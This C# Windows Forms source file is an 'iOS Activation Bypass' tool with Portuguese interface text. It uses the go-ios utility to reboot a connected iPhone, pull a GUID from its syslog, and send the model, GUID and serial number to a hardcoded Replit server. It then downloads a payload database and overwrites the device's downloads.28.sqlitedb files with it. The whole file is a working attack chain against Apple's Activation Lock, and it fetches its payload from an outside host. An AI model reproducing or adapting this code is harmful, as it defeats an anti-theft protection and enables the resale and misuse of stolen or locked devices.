using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Drawing;

namespace GoIosBypassSuite
{
    public class GoIosDevice
    {
        public string Udid { get; set; }
        public string DeviceName { get; set; }
        public string ProductVersion { get; set; }
        public string ProductType { get; set; }
        public string HardwareModel { get; set; }
        public Dictionary<string, object> DeviceValues { get; set; }
    }

    public partial class BypassForm : Form
    {
        private const string TOOL_EXEC = "iOS.exe";
        private string REMOTE_API = "https://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev";
        private const int TRIGGER_TIMEOUT = 300;

        private static readonly HttpClient _httpClient = new HttpClient();
        private GoIosDevice _targetDevice;
        private Process _tunnelProcess;
        private bool _isRunning = false;

        private TextBox logBox;
        private Button startButton;
        private Button stopButton;
        private ComboBox apiModeCombo;
        private TextBox apiUrlBox;

        public BypassForm()
        {
            InitializeComponent();
            CheckEnvironment();
        }

        private void InitializeComponent()
        {
            this.Text = "iOS Activation Bypass";
            this.Width = 700;
            this.Height = 600;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(20, 20, 20);
            this.ForeColor = Color.White;

            // Header Label
            Label headerLabel = new Label
            {
                Text = "iOS Activation Bypass Client",
                Font = new Font("Segoe UI", 16, FontStyle.Bold),
                AutoSize = true,
                Location = new Point(20, 20),
                ForeColor = Color.Cyan
            };
            this.Controls.Add(headerLabel);

            // API Mode Label
            Label modeLabel = new Label
            {
                Text = "Modo de Servidor:",
                Location = new Point(20, 60),
                AutoSize = true
            };
            this.Controls.Add(modeLabel);

            // API Mode Combo
            apiModeCombo = new ComboBox
            {
                Location = new Point(20, 85),
                Width = 200,
                DropDownStyle = ComboBoxStyle.DropDownList,
                BackColor = Color.FromArgb(40, 40, 40),
                ForeColor = Color.White
            };
            apiModeCombo.Items.AddRange(new[] { "Replit (Cloud)", "Localhost", "Customizado" });
            apiModeCombo.SelectedIndex = 0;
            apiModeCombo.SelectedIndexChanged += ApiMode_Changed;
            this.Controls.Add(apiModeCombo);

            // API URL Label
            Label urlLabel = new Label
            {
                Text = "URL do Servidor:",
                Location = new Point(20, 120),
                AutoSize = true
            };
            this.Controls.Add(urlLabel);

            // API URL Box
            apiUrlBox = new TextBox
            {
                Location = new Point(20, 145),
                Width = 600,
                Height = 30,
                BackColor = Color.FromArgb(40, 40, 40),
                ForeColor = Color.White,
                Text = REMOTE_API,
                ReadOnly = true
            };
            this.Controls.Add(apiUrlBox);

            // Log Box
            logBox = new TextBox
            {
                Location = new Point(20, 190),
                Width = 640,
                Height = 300,
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                BackColor = Color.FromArgb(20, 20, 20),
                ForeColor = Color.Lime,
                Font = new Font("Consolas", 10),
                ReadOnly = true
            };
            this.Controls.Add(logBox);

            // Start Button
            startButton = new Button
            {
                Text = "▶ INICIAR",
                Location = new Point(20, 510),
                Width = 150,
                Height = 40,
                BackColor = Color.FromArgb(0, 120, 0),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 11, FontStyle.Bold)
            };
            startButton.Click += StartButton_Click;
            this.Controls.Add(startButton);

            // Stop Button
            stopButton = new Button
            {
                Text = "⏹ PARAR",
                Location = new Point(180, 510),
                Width = 150,
                Height = 40,
                BackColor = Color.FromArgb(120, 0, 0),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 11, FontStyle.Bold),
                Enabled = false
            };
            stopButton.Click += StopButton_Click;
            this.Controls.Add(stopButton);

            // Clear Button
            Button clearButton = new Button
            {
                Text = "🗑 LIMPAR",
                Location = new Point(340, 510),
                Width = 150,
                Height = 40,
                BackColor = Color.FromArgb(80, 80, 80),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 11, FontStyle.Bold)
            };
            clearButton.Click += (s, e) => logBox.Clear();
            this.Controls.Add(clearButton);
        }

        private void ApiMode_Changed(object sender, EventArgs e)
        {
            switch (apiModeCombo.SelectedIndex)
            {
                case 0: // Replit
                    REMOTE_API = "https://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev";
                    apiUrlBox.ReadOnly = true;
                    break;
                case 1: // Localhost
                    REMOTE_API = "http://localhost:5000";
                    apiUrlBox.ReadOnly = true;
                    break;
                case 2: // Custom
                    apiUrlBox.ReadOnly = false;
                    break;
            }
            apiUrlBox.Text = REMOTE_API;
        }

        private void StartButton_Click(object sender, EventArgs e)
        {
            if (_isRunning) return;

            if (apiModeCombo.SelectedIndex == 2)
                REMOTE_API = apiUrlBox.Text;

            _isRunning = true;
            startButton.Enabled = false;
            stopButton.Enabled = true;

            _ = RunBypassAsync();
        }

        private void StopButton_Click(object sender, EventArgs e)
        {
            _isRunning = false;
            CleanupTunnel();
            Log("Operação cancelada.", Color.Yellow);
            startButton.Enabled = true;
            stopButton.Enabled = false;
        }

        private async Task RunBypassAsync()
        {
            try
            {
                Log("▶ Iniciando...", Color.Cyan);
                await Task.Delay(1000);

                Log("[*] Esperando dispositivo...", Color.White);
                _targetDevice = await WaitForDevice(30);
                Log($"[✓] Conectado: {_targetDevice.DeviceName}", Color.Green);

                StartTunnelDaemon();

                Log("[*] Pressione qualquer tecla para continuar", Color.Yellow);
                await Task.Delay(3000);

                await RunSequence();

                Log("[SUCCESS] Processo concluído!", Color.Green);
            }
            catch (Exception ex)
            {
                Log($"[-] Erro: {ex.Message}", Color.Red);
            }
            finally
            {
                CleanupTunnel();
                _isRunning = false;
                startButton.Enabled = true;
                stopButton.Enabled = false;
            }
        }

        private async Task RunSequence()
        {
            if (!_isRunning) return;

            Log("\n=== FASE 1: Reset Inicial ===", Color.Magenta);
            RunGoIosCommand("reboot");
            await WaitForDeviceReconnection(120);

            if (!_isRunning) return;

            Log("\n=== FASE 2: Extração do GUID ===", Color.Magenta);
            string guid = await ExtractGuidFromSyslog();
            Log($"[✓] GUID: {guid}", Color.Green);

            if (!_isRunning) return;

            Log("\n=== FASE 3: Autorização do Servidor ===", Color.Magenta);
            string downloadUrl = await GetPayloadUrl(_targetDevice.ProductType, guid, GetSerialNumber(_targetDevice));
            Log($"[✓] URL: {downloadUrl}", Color.Green);

            if (!_isRunning) return;

            Log("\n=== FASE 4: Download do Payload ===", Color.Magenta);
            string localFile = "payload.db";
            await DownloadFile(downloadUrl, localFile);
            Log($"[✓] Download concluído", Color.Green);

            if (!_isRunning) return;

            Log("\n=== FASE 5: Limpeza de Artefatos ===", Color.Magenta);
            RemoveRemoteFile("/Downloads/downloads.28.sqlitedb");
            RemoveRemoteFile("/Downloads/downloads.28.sqlitedb-shm");
            RemoveRemoteFile("/Downloads/downloads.28.sqlitedb-wal");

            if (!_isRunning) return;

            Log("\n=== FASE 6: Injeção de Payload ===", Color.Magenta);
            PushFile(localFile, "/Downloads/downloads.28.sqlitedb");
            File.Delete(localFile);
            Log("[✓] Payload injetado", Color.Green);

            if (!_isRunning) return;

            Log("\n=== FASE 7: Reboot de Aplicação ===", Color.Magenta);
            RunGoIosCommand("reboot");
            await WaitForDeviceReconnection(300);

            Log("\n[SUCCESS] Sequência concluída com sucesso!", Color.Green);
        }

        private void StartTunnelDaemon()
        {
            Log("[*] Iniciando Tunnel...", Color.Yellow);
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = TOOL_EXEC,
                    Arguments = "tunnel start",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                _tunnelProcess = Process.Start(startInfo);
                Thread.Sleep(3000);

                if (_tunnelProcess.HasExited)
                {
                    throw new Exception("Tunnel falhou ao iniciar");
                }
                Log("[✓] Tunnel ativo", Color.Green);
            }
            catch (Exception ex)
            {
                Log($"[-] Erro no Tunnel: {ex.Message}", Color.Red);
                throw;
            }
        }

        private void CleanupTunnel()
        {
            if (_tunnelProcess != null && !_tunnelProcess.HasExited)
            {
                try { _tunnelProcess.Kill(); } catch { }
            }
        }

        private string RunGoIosCommand(string args)
        {
            var psi = new ProcessStartInfo
            {
                FileName = TOOL_EXEC,
                Arguments = args,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();
                p.WaitForExit();

                if (p.ExitCode != 0 && !string.IsNullOrEmpty(error))
                {
                    if (!error.Contains("warn", StringComparison.OrdinalIgnoreCase))
                        Log($"[!] {args}: {error.Trim()}", Color.Yellow);
                }

                return output;
            }
        }

        private void PushFile(string localPath, string remotePath)
        {
            Log($"    → Enviando {localPath} → {remotePath}", Color.DarkGray);
            RunGoIosCommand($"fsync push --srcPath=\"{localPath}\" --dstPath=\"{remotePath}\"");
        }

        private void RemoveRemoteFile(string remotePath)
        {
            Log($"    → Deletando {remotePath}", Color.DarkGray);
            RunGoIosCommand($"fsync rm --path=\"{remotePath}\"");
        }

        private async Task<bool> WaitForRemoteFile(string remotePath, int timeoutSeconds)
        {
            var end = DateTime.Now.AddSeconds(timeoutSeconds);
            while (DateTime.Now < end && _isRunning)
            {
                string output = RunGoIosCommand($"fsync tree --path=\"{remotePath}\"");

                if (!string.IsNullOrWhiteSpace(output) && !output.Contains("no such file") && !output.Contains("error"))
                    return true;

                await Task.Delay(2000);
            }
            return false;
        }

        private async Task<string> ExtractGuidFromSyslog()
        {
            Log("[*] Procurando GUID nos logs...", Color.White);

            var psi = new ProcessStartInfo
            {
                FileName = TOOL_EXEC,
                Arguments = "syslog",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            using (var p = Process.Start(psi))
            {
                var cts = new System.Threading.CancellationTokenSource();
                string foundGuid = null;

                _ = Task.Run(async () =>
                {
                    string line;
                    while ((line = await p.StandardOutput.ReadLineAsync()) != null)
                    {
                        if (line.Contains("BLDatabaseManager.sqlite"))
                        {
                            var match = Regex.Match(line, @"SystemGroup/([A-F0-9\-]{36})");
                            if (match.Success)
                            {
                                foundGuid = match.Groups[1].Value;
                                cts.Cancel();
                            }
                        }
                    }
                }, cts.Token);

                try { await Task.Delay(60000, cts.Token); } catch (TaskCanceledException) { }

                try { p.Kill(); } catch { }

                if (foundGuid == null) throw new Exception("GUID não encontrado nos logs");
                return foundGuid;
            }
        }

        private async Task<GoIosDevice> WaitForDevice(int timeoutSec)
        {
            var end = DateTime.Now.AddSeconds(timeoutSec);
            while (DateTime.Now < end && _isRunning)
            {
                string json = RunGoIosCommand("list --details");
                try
                {
                    if (json.Contains("UDID"))
                    {
                        var devices = JsonSerializer.Deserialize<List<GoIosDevice>>(json);
                        if (devices != null && devices.Count > 0) return devices[0];
                    }

                    var root = JsonDocument.Parse(json);
                    if (root.RootElement.TryGetProperty("devices", out var devArray) && devArray.GetArrayLength() > 0)
                    {
                        var first = devArray[0];
                        return new GoIosDevice
                        {
                            Udid = first.GetProperty("UDID").GetString(),
                            DeviceName = first.GetProperty("DeviceName").GetString(),
                            ProductType = first.GetProperty("ProductType").GetString()
                        };
                    }
                }
                catch { }

                await Task.Delay(2000);
            }
            throw new Exception("Nenhum dispositivo detectado");
        }

        private async Task WaitForDeviceReconnection(int timeoutSec)
        {
            Log("[*] Esperando reconexão...", Color.Yellow);
            await Task.Delay(10000);
            await WaitForDevice(timeoutSec);
            Log("[✓] Dispositivo reconectado", Color.Green);
        }

        private async Task<string> GetPayloadUrl(string model, string guid, string sn)
        {
            var url = $"{REMOTE_API}?prd={model}&guid={guid}&sn={sn}";
            var response = await _httpClient.GetStringAsync(url);
            return response.Trim();
        }

        private async Task DownloadFile(string url, string path)
        {
            var data = await _httpClient.GetByteArrayAsync(url);
            await File.WriteAllBytesAsync(path, data);
        }

        private string GetSerialNumber(GoIosDevice device)
        {
            if (device.DeviceValues != null && device.DeviceValues.ContainsKey("SerialNumber"))
                return device.DeviceValues["SerialNumber"].ToString();
            return "UNKNOWN_SN";
        }

        private void CheckEnvironment()
        {
            if (!File.Exists(TOOL_EXEC))
            {
                MessageBox.Show($"❌ Não foi possível encontrar {TOOL_EXEC}.\n\nColoque o arquivo na mesma pasta do programa.", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(1);
            }
        }

        private void Log(string message, Color color)
        {
            if (logBox.InvokeRequired)
            {
                logBox.Invoke(new Action(() => Log(message, color)));
                return;
            }

            logBox.AppendText($"{DateTime.Now:HH:mm:ss} ");
            int start = logBox.TextLength;
            logBox.AppendText(message + "\n");
            int end = logBox.TextLength;

            logBox.Select(start, end - start);
            logBox.SelectionColor = color;
            logBox.Select(end, 0);

            logBox.ScrollToCaret();
        }

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.Run(new BypassForm());
        }
    }
}
